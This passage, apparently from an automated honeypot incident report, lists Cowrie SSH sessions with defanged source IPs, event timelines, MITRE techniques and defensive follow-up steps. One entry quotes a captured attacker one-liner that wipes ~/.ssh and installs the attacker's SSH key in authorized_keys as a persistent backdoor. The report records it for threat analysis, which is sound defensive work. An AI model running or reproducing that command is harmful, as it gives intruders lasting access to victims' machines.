| `2026-07-15 03:32:10` | `cowrie.session.connect` |
| `2026-07-15 03:32:10` | `cowrie.client.version` |
| `2026-07-15 03:32:10` | `cowrie.client.kex` |
| `2026-07-15 03:32:11` | `cowrie.login.success` |
| `2026-07-15 03:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07b0445e8e70

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-15 03:32 |
| **Last Seen** | 2026-07-15 03:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:32:10` | `cowrie.session.connect` |
| `2026-07-15 03:32:10` | `cowrie.client.version` |
| `2026-07-15 03:32:10` | `cowrie.client.kex` |
| `2026-07-15 03:32:11` | `cowrie.login.success` |
| `2026-07-15 03:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-687645747010

| Field | Detail |
|---|---|
| **Source IP** | `186.103.136[.]43` |
| **First Seen** | 2026-07-15 03:35 |
| **Last Seen** | 2026-07-15 03:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:35:57` | `cowrie.session.connect` |
| `2026-07-15 03:35:58` | `cowrie.client.version` |
| `2026-07-15 03:35:58` | `cowrie.client.kex` |
| `2026-07-15 03:36:01` | `cowrie.login.success` |
| `2026-07-15 03:36:01` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.136[.]43` to AbuseIPDB if not already reported
- [ ] Block `186.103.136[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58e2eeba1d44

| Field | Detail |
|---|---|
| **Source IP** | `180.188.253[.]150` |
| **First Seen** | 2026-07-15 03:36 |
| **Last Seen** | 2026-07-15 03:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:36:07` | `cowrie.session.connect` |
| `2026-07-15 03:36:08` | `cowrie.client.version` |
| `2026-07-15 03:36:08` | `cowrie.client.kex` |
| `2026-07-15 03:36:11` | `cowrie.login.success` |
| `2026-07-15 03:36:12` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.188.253[.]150` to AbuseIPDB if not already reported
- [ ] Block `180.188.253[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04eb7dac442b

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]185` |
| **First Seen** | 2026-07-15 03:38 |
| **Last Seen** | 2026-07-15 03:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:38:21` | `cowrie.session.connect` |
| `2026-07-15 03:38:21` | `cowrie.client.version` |
| `2026-07-15 03:38:21` | `cowrie.client.kex` |
| `2026-07-15 03:38:23` | `cowrie.login.success` |
| `2026-07-15 03:38:23` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]185` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0db86555b78

| Field | Detail |
|---|---|
| **Source IP** | `218.106.33[.]54` |
| **First Seen** | 2026-07-15 03:45 |
| **Last Seen** | 2026-07-15 03:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:45:57` | `cowrie.session.connect` |
| `2026-07-15 03:45:57` | `cowrie.client.version` |
| `2026-07-15 03:45:57` | `cowrie.client.kex` |
| `2026-07-15 03:45:58` | `cowrie.login.success` |
| `2026-07-15 03:45:59` | `cowrie.session.params` |
| `2026-07-15 03:45:59` | `cowrie.command.input` |
| `2026-07-15 03:45:59` | `cowrie.command.failed` |
| `2026-07-15 03:46:00` | `cowrie.log.closed` |
| `2026-07-15 03:46:00` | `cowrie.session.params` |
| `2026-07-15 03:46:00` | `cowrie.command.input` |
| `2026-07-15 03:46:01` | `cowrie.session.file_download` |
| `2026-07-15 03:46:01` | `cowrie.log.closed` |
| `2026-07-15 03:46:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.106.33[.]54` to AbuseIPDB if not already reported
- [ ] Block `218.106.33[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bad34be6212

| Field | Detail |
|---|---|
| **Source IP** | `218.106.33[.]54` |
| **First Seen** | 2026-07-15 03:46 |
| **Last Seen** | 2026-07-15 03:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:46:01` | `cowrie.session.connect` |
| `2026-07-15 03:46:01` | `cowrie.client.version` |
| `2026-07-15 03:46:01` | `cowrie.client.kex` |
| `2026-07-15 03:46:02` | `cowrie.login.success` |
| `2026-07-15 03:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.106.33[.]54` to AbuseIPDB if not already reported
- [ ] Block `218.106.33[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf4cf8e02f91

| Field | Detail |
|---|---|
| **Source IP** | `218.106.33[.]54` |
| **First Seen** | 2026-07-15 03:46 |
| **Last Seen** | 2026-07-15 03:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:46:03` | `cowrie.session.connect` |
| `2026-07-15 03:46:03` | `cowrie.client.version` |
| `2026-07-15 03:46:03` | `cowrie.client.kex` |
| `2026-07-15 03:46:04` | `cowrie.login.success` |
| `2026-07-15 03:46:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.106.33[.]54` to AbuseIPDB if not already reported
- [ ] Block `218.106.33[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e577fb2c9643

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 03:47 |
| **Last Seen** | 2026-07-15 03:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:47:43` | `cowrie.session.connect` |
| `2026-07-15 03:47:43` | `cowrie.client.version` |
| `2026-07-15 03:47:43` | `cowrie.client.kex` |
| `2026-07-15 03:47:44` | `cowrie.login.success` |
| `2026-07-15 03:47:45` | `cowrie.session.params` |
| `2026-07-15 03:47:45` | `cowrie.command.input` |
| `2026-07-15 03:47:45` | `cowrie.log.closed` |
| `2026-07-15 03:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67deaae81540

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 03:48 |
| **Last Seen** | 2026-07-15 03:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:48:28` | `cowrie.session.connect` |
| `2026-07-15 03:48:28` | `cowrie.client.version` |
| `2026-07-15 03:48:29` | `cowrie.client.kex` |
| `2026-07-15 03:48:29` | `cowrie.login.success` |
| `2026-07-15 03:48:29` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:48:29` | `cowrie.direct-tcpip.data` |
| `2026-07-15 03:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a1bf1b0254b

| Field | Detail |
|---|---|
| **Source IP** | `46.29.26[.]195` |
| **First Seen** | 2026-07-15 03:56 |
| **Last Seen** | 2026-07-15 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:56:46` | `cowrie.session.connect` |
| `2026-07-15 03:56:46` | `cowrie.client.version` |
| `2026-07-15 03:56:46` | `cowrie.client.kex` |
| `2026-07-15 03:56:47` | `cowrie.login.success` |
| `2026-07-15 03:56:47` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:56:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-15 03:56:47` | `cowrie.direct-tcpip.data` |
| `2026-07-15 03:56:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.29.26[.]195` to AbuseIPDB if not already reported
- [ ] Block `46.29.26[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa441d9e4c61

| Field | Detail |
|---|---|
| **Source IP** | `81.22.51[.]64` |
| **First Seen** | 2026-07-15 03:57 |
| **Last Seen** | 2026-07-15 03:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:57:41` | `cowrie.session.connect` |
| `2026-07-15 03:57:42` | `cowrie.client.version` |
| `2026-07-15 03:57:42` | `cowrie.client.kex` |
| `2026-07-15 03:57:43` | `cowrie.login.success` |
| `2026-07-15 03:57:43` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.22.51[.]64` to AbuseIPDB if not already reported
- [ ] Block `81.22.51[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ab3c767978c

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-07-15 03:57 |
| **Last Seen** | 2026-07-15 03:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:57:48` | `cowrie.session.connect` |
| `2026-07-15 03:57:48` | `cowrie.client.version` |
| `2026-07-15 03:57:48` | `cowrie.client.kex` |
| `2026-07-15 03:57:49` | `cowrie.login.success` |
| `2026-07-15 03:57:50` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb787dbaa1cc

| Field | Detail |
|---|---|
| **Source IP** | `34.79.128[.]63` |
| **First Seen** | 2026-07-15 03:57 |
| **Last Seen** | 2026-07-15 03:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:57:53` | `cowrie.session.connect` |
| `2026-07-15 03:57:53` | `cowrie.login.success` |
| `2026-07-15 03:57:53` | `cowrie.session.params` |
| `2026-07-15 03:57:53` | `cowrie.command.input` |
| `2026-07-15 03:57:53` | `cowrie.command.input` |
| `2026-07-15 03:57:53` | `cowrie.command.failed` |
| `2026-07-15 03:57:53` | `cowrie.command.input` |
| `2026-07-15 03:57:53` | `cowrie.log.closed` |
| `2026-07-15 03:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.128[.]63` to AbuseIPDB if not already reported
- [ ] Block `34.79.128[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-745c0ca7e4b4

| Field | Detail |
|---|---|
| **Source IP** | `64.53.7[.]231` |
| **First Seen** | 2026-07-15 03:57 |
| **Last Seen** | 2026-07-15 03:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:57:56` | `cowrie.session.connect` |
| `2026-07-15 03:57:56` | `cowrie.client.version` |
| `2026-07-15 03:57:56` | `cowrie.client.kex` |
| `2026-07-15 03:57:57` | `cowrie.login.success` |
| `2026-07-15 03:57:57` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.53.7[.]231` to AbuseIPDB if not already reported
- [ ] Block `64.53.7[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d42f5e61d121

| Field | Detail |
|---|---|
| **Source IP** | `34.79.128[.]63` |
| **First Seen** | 2026-07-15 03:58 |
| **Last Seen** | 2026-07-15 03:58 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:58:01` | `cowrie.session.connect` |
| `2026-07-15 03:58:01` | `cowrie.login.success` |
| `2026-07-15 03:58:02` | `cowrie.session.params` |
| `2026-07-15 03:58:02` | `cowrie.command.input` |
| `2026-07-15 03:58:02` | `cowrie.command.failed` |
| `2026-07-15 03:58:14` | `cowrie.log.closed` |
| `2026-07-15 03:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.128[.]63` to AbuseIPDB if not already reported
- [ ] Block `34.79.128[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47476cb383f9

| Field | Detail |
|---|---|
| **Source IP** | `64.53.7[.]231` |
| **First Seen** | 2026-07-15 03:58 |
| **Last Seen** | 2026-07-15 03:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:58:02` | `cowrie.session.connect` |
| `2026-07-15 03:58:03` | `cowrie.client.version` |
| `2026-07-15 03:58:03` | `cowrie.client.kex` |
| `2026-07-15 03:58:04` | `cowrie.login.success` |
| `2026-07-15 03:58:05` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.53.7[.]231` to AbuseIPDB if not already reported
- [ ] Block `64.53.7[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe6cf2bca9db

| Field | Detail |
|---|---|
| **Source IP** | `34.79.128[.]63` |
| **First Seen** | 2026-07-15 03:58 |
| **Last Seen** | 2026-07-15 03:58 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:58:03` | `cowrie.session.connect` |
| `2026-07-15 03:58:03` | `cowrie.login.success` |
| `2026-07-15 03:58:04` | `cowrie.session.params` |
| `2026-07-15 03:58:04` | `cowrie.command.input` |
| `2026-07-15 03:58:14` | `cowrie.log.closed` |
| `2026-07-15 03:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.128[.]63` to AbuseIPDB if not already reported
- [ ] Block `34.79.128[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ac87913f053

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]60` |
| **First Seen** | 2026-07-15 04:00 |
| **Last Seen** | 2026-07-15 04:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:00:08` | `cowrie.session.connect` |
| `2026-07-15 04:00:08` | `cowrie.client.version` |
| `2026-07-15 04:00:08` | `cowrie.client.kex` |
| `2026-07-15 04:00:09` | `cowrie.login.success` |
| `2026-07-15 04:00:09` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]60` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f97ef46fceec

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]215` |
| **First Seen** | 2026-07-15 04:00 |
| **Last Seen** | 2026-07-15 04:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:00:22` | `cowrie.session.connect` |
| `2026-07-15 04:00:22` | `cowrie.client.version` |
| `2026-07-15 04:00:23` | `cowrie.client.kex` |
| `2026-07-15 04:00:25` | `cowrie.login.success` |
| `2026-07-15 04:00:26` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]215` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]215` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6c1042eb076

| Field | Detail |
|---|---|
| **Source IP** | `60.167.19[.]189` |
| **First Seen** | 2026-07-15 04:01 |
| **Last Seen** | 2026-07-15 04:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:01:16` | `cowrie.session.connect` |
| `2026-07-15 04:01:17` | `cowrie.client.version` |
| `2026-07-15 04:01:17` | `cowrie.client.kex` |
| `2026-07-15 04:01:19` | `cowrie.login.success` |
| `2026-07-15 04:01:20` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:01:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.167.19[.]189` to AbuseIPDB if not already reported
- [ ] Block `60.167.19[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0200dd6717e0

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]21` |
| **First Seen** | 2026-07-15 04:01 |
| **Last Seen** | 2026-07-15 04:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:01:18` | `cowrie.session.connect` |
| `2026-07-15 04:01:19` | `cowrie.client.version` |
| `2026-07-15 04:01:19` | `cowrie.client.kex` |
| `2026-07-15 04:01:21` | `cowrie.login.success` |
| `2026-07-15 04:01:22` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]21` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-508923f82d97

| Field | Detail |
|---|---|
| **Source IP** | `222.75.225[.]206` |
| **First Seen** | 2026-07-15 04:01 |
| **Last Seen** | 2026-07-15 04:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:01:28` | `cowrie.session.connect` |
| `2026-07-15 04:01:29` | `cowrie.client.version` |
| `2026-07-15 04:01:29` | `cowrie.client.kex` |
| `2026-07-15 04:01:32` | `cowrie.login.success` |
| `2026-07-15 04:01:33` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.75.225[.]206` to AbuseIPDB if not already reported
- [ ] Block `222.75.225[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25dcfe8b543d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-15 04:06 |
| **Last Seen** | 2026-07-15 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:06:02` | `cowrie.session.connect` |
| `2026-07-15 04:06:02` | `cowrie.client.version` |
| `2026-07-15 04:06:02` | `cowrie.client.kex` |
| `2026-07-15 04:06:02` | `cowrie.login.success` |
| `2026-07-15 04:06:02` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:06:03` | `cowrie.direct-tcpip.ja4` |
| `2026-07-15 04:06:03` | `cowrie.direct-tcpip.data` |
| `2026-07-15 04:06:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42e99daf3b29

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-15 04:11 |
| **Last Seen** | 2026-07-15 04:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:11:41` | `cowrie.session.connect` |
| `2026-07-15 04:11:41` | `cowrie.client.version` |
| `2026-07-15 04:11:41` | `cowrie.client.kex` |
| `2026-07-15 04:11:43` | `cowrie.login.success` |
| `2026-07-15 04:11:43` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:11:43` | `cowrie.direct-tcpip.ja4` |
| `2026-07-15 04:11:43` | `cowrie.direct-tcpip.data` |
| `2026-07-15 04:11:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e111e1df669a

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-15 04:13 |
| **Last Seen** | 2026-07-15 04:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
